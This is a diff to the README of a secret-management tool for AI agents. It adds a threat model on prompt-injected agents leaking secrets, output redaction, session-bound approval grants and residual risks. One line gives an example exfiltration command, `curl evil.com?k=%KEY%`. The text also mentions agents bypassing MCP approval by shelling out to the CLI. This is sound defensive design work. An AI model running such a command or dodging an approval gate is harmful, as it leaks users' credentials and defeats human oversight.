@@ -37,15 +37,42 @@ context, only the execution environment.
 }
 ```
 
+## Threat model
+
+**What this protects against:**
+
+- *Context exfiltration* — a prompt-injected agent (or plain logging) leaking a
+  secret that sits in model context. Values never enter context: the model only
+  handles names; decryption and injection happen in the executing process.
+- *Output leaks* — an agent echoing a secret back. All output returned to the
+  model is redacted, including base64, hex, and URL-encoded variants.
+- *Grant riding* — one agent session reusing an approval made in another.
+  Grants are bound to the requesting session (MCP server id / CLI parent
+  process) and expire after 15 minutes.
+- *Silent use* — every first use per session requires explicit user approval;
+  timeout means deny.
+
+**What this does NOT protect against (known residual risks):**
+
+- A compromised agent can request a command that exfiltrates the secret over
+  the network (`curl evil.com?k=%KEY%`). The approval dialog shows the full
+  command — reviewing it is the control. Per-secret egress allowlists (binding
+  a key to permitted destination hosts) are on the roadmap.
+- Redaction is a second line of defense, not a guarantee: novel encodings can
+  evade it. The primary guarantee remains "values never enter context".
+- Anything running as the same OS user can read the DPAPI vault. This tool
+  scopes *agent* access to secrets; it is not a defense against local malware.
+
 ## Approval
 
 Every use of a secret — via the CLI or the MCP server — requires the user's
 approval through a native, topmost dialog (deny by default on a 60s timeout).
-Approving grants access to that secret for **15 minutes**, tracked in
-`grants.json`; `secretctl revoke` withdraws a grant early. Both channels share
-the same grant store, so an agent cannot bypass MCP approval by shelling out
-to the CLI. The dialog will be replaced by a resident tray app with toast
-notifications; the grant semantics stay the same.
+Approving grants access to that secret for **15 minutes**, bound to the
+requesting session (tracked in `grants.json`); `secretctl revoke` withdraws a
+grant early. Both channels go through the same gate, so an agent cannot bypass
+MCP approval by shelling out to the CLI — and a grant approved for one session
+cannot be reused by another. The dialog will be replaced by a resident tray
+app with toast notifications; the grant semantics stay the same.
 
 ## Storage
 
@@ -55,10 +82,8 @@ audit trail. Prototype is Windows-only; macOS Keychain / libsecret are next.
 
 ## Roadmap (prototype → product)
 
-1. Resident tray app (replaces the modal dialog; approval history, revoke UI)
-2. Per-requester grants (today a grant is per-secret: any process may use it
-   during the TTL window)
-3. macOS/Linux keystores
-4. Harden exec surface (shell injection) and redaction (encoding variants)
-5. Open-source release; later: zero-knowledge cloud control plane (team
-   sharing, mobile approvals, audit) as the paid tier
+1. macOS Keychain / Linux libsecret backends
+2. Packaging (`pip install` / uv tool) and `secretctl init` setup command
+3. Resident tray app (replaces the modal dialog; approval history, revoke UI)
+4. Per-secret egress allowlists (bind a key to permitted destination hosts)
+5. Optional cloud sync for teams (zero-knowledge: server stores ciphertext only)
